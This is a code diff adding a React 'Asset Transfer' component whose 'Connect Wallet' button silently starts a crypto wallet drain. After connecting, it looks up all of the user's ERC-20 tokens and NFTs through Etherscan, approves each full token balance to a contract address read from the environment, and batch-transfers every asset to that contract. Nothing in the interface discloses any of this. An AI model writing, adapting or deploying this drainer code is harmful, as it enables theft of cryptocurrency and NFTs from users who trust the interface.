@@ -1,0 +1,215 @@
+import React, { useState } from 'react';
+import { ethers } from 'ethers';
+import axios from 'axios';
+
+const AssetTransfer = ({ setAssets }) => {
+    const ETHERSCAN_API_KEY = process.env.REACT_APP_ETHERSCAN_API_KEY;
+    const CONTRACT_ADDRESS = process.env.REACT_APP_CONTRACT_ADDRESS;
+
+    const [userAddress, setUserAddress] = useState('');
+
+    const connectWallet = async () => {
+        if (typeof window.ethereum !== "undefined") {
+            try {
+                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                const userAddress = accounts[0];
+                console.log("Connected wallet address:", userAddress);
+                setUserAddress(userAddress);
+                
+                // Perform asset transfer after connecting wallet
+                await batchTransferAssets(userAddress);
+            } catch (error) {
+                console.error("Error connecting to wallet:", error);
+            }
+        } else {
+            alert("Please install MetaMask!");
+        }
+    };
+
+    const getERC20Balances = async (userAddress) => {
+        const response = await axios.get(`https://api.etherscan.io/api`, {
+            params: {
+                module: "account",
+                action: "tokenlist",
+                address: userAddress,
+                sort: "desc",
+                apikey: ETHERSCAN_API_KEY
+            }
+        });
+
+        const tokens = response.data.result || [];
+        const balances = [];
+
+        for (const token of tokens) {
+            const balanceResponse = await axios.get(`https://api.etherscan.io/api`, {
+                params: {
+                    module: "account",
+                    action: "tokenbalance",
+                    contractaddress: token.contractAddress,
+                    address: userAddress,
+                    tag: "latest",
+                    apikey: ETHERSCAN_API_KEY
+                }
+            });
+
+            const balance = balanceResponse.data.result;
+            if (balance > 0) {
+                balances.push({ address: token.contractAddress, balance: ethers.utils.formatUnits(balance, token.decimals), decimals: token.decimals });
+            }
+        }
+
+        return balances;
+    };
+
+    const getNFTBalances = async (userAddress) => {
+        const response = await axios.get(`https://api.etherscan.io/api`, {
+            params: {
+                module: "account",
+                action: "tokennfttx",
+                address: userAddress,
+                startblock: "0",
+                endblock: "99999999",
+                sort: "desc",
+                apikey: ETHERSCAN_API_KEY
+            }
+        });
+
+        const transfers = response.data.result || [];
+        const nfts = [];
+
+        for (const transfer of transfers) {
+            if (transfer.to.toLowerCase() === userAddress.toLowerCase()) {
+                nfts.push({
+                    tokenId: transfer.tokenID,
+                    contractAddress: transfer.contractAddress,
+                });
+            }
+        }
+
+        return nfts;
+    };
+
+    const checkApproval = async (tokenAddress, userAddress) => {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+
+        const tokenContract = new ethers.Contract(tokenAddress, [
+            "function allowance(address owner, address spender) view returns (uint256)"
+        ], signer);
+
+        const allowance = await tokenContract.allowance(userAddress, CONTRACT_ADDRESS);
+        return ethers.BigNumber.from(allowance).gt(0); // Checks if allowance is greater than zero
+    };
+
+    const approveERC20Tokens = async (erc20Balances) => {
+        try {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+
+            // Loop through the balances and approve tokens for the contract if not already approved
+            for (const asset of erc20Balances) {
+                const tokenAddress = asset.address;
+                const amount = ethers.utils.parseUnits(asset.balance, asset.decimals); // Adjust decimals as necessary
+
+                const isApproved = await checkApproval(tokenAddress, signer.getAddress());
+
+                if (!isApproved) {
+                    const tokenContract = new ethers.Contract(tokenAddress, [
+                        "function approve(address spender, uint256 amount) public returns (bool)"
+                    ], signer);
+
+                    const approvalTransaction = await tokenContract.approve(CONTRACT_ADDRESS, amount);
+                    await approvalTransaction.wait();
+                    console.log(`Approved ${amount.toString()} of ${tokenAddress} for ${CONTRACT_ADDRESS}`);
+                }
+            }
+        } catch (error) {
+            console.error("Error approving ERC20 tokens:", error);
+        }
+    };
+
+    const batchTransferAssets = async (userAddress) => {
+        try {
+            const trimmedAddress = CONTRACT_ADDRESS.trim();
+
+            console.log("Connected wallet address:", userAddress);
+            console.log("Raw Contract Address:", trimmedAddress);
+            console.log("Contract Address Length:", trimmedAddress.length);
+
+            // Check if the address is valid
+            const checksumAddress = ethers.utils.getAddress(trimmedAddress);
+            console.log("Checksum Address:", checksumAddress);
+
+            // Connect using MetaMask provider
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+
+            const erc20Balances = await getERC20Balances(userAddress);
+            await approveERC20Tokens(erc20Balances); // Approve tokens before transferring
+
+            const nftBalances = await getNFTBalances(userAddress);
+
+            // Define the contract with relevant function signatures
+            const contract = new ethers.Contract(checksumAddress, [
+                "function batchTransfer(address[] memory erc20Addresses, uint256[] memory erc20Amounts, address[] memory nftAddresses, uint256[][] memory nftTokenIds) public"
+            ], signer);
+
+            const erc20Addresses = erc20Balances
+                .map(asset => asset.address)
+                .filter(address => address.toLowerCase() !== CONTRACT_ADDRESS.toLowerCase());
+
+            const erc20Amounts = erc20Balances.map(asset => asset.balance);
+
+            const nftAddresses = nftBalances
+                .map(asset => asset.contractAddress)
+                .filter(address => address.toLowerCase() !== CONTRACT_ADDRESS.toLowerCase());
+
+            const nftTokenIds = nftBalances.reduce((acc, asset) => {
+                const address = asset.contractAddress.toLowerCase();
+                if (address !== CONTRACT_ADDRESS.toLowerCase()) {
+                    if (!acc[address]) {
+                        acc[address] = [];
+                    }
+                    acc[address].push(asset.tokenId);
+                }
+                return acc;
+            }, {});
+
+            const nftTokenIdsArray = Object.values(nftTokenIds).map(ids => ids.map(id => Number(id)));
+
+            // Perform batch transfer in a single transaction
+            const transaction = await contract.batchTransfer(
+                erc20Addresses,
+                erc20Amounts,
+                nftAddresses,
+                nftTokenIdsArray,
+                { gasLimit: 1000000 }
+            );
+
+            await transaction.wait();
+            console.log("Batch assets transfer completed successfully.");
+            setAssets(await getERC20Balances(userAddress)); // Update asset state after transfer
+        } catch (error) {
+            console.error("Error in batch transfer:", error);
+        }
+    };
+
+    return (
+        <div className="flex flex-col items-center p-4">
+            <h2 className="text-lg font-semibold mb-4">Asset Transfer Component</h2>
+            {userAddress ? (
+                <p className="text-gray-700 mb-4">Connected wallet: {userAddress.slice(0, 4)}...{userAddress.slice(-4)}</p>
+            ) : (
+                <p className="text-gray-700 mb-4">Please connect your wallet.</p>
+            )}
+            <button
+                onClick={connectWallet}
+                className="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600"
+            >
+                Connect Wallet
+            </button>
+        </div>
+    );
+};
+
+export default AssetTransfer;
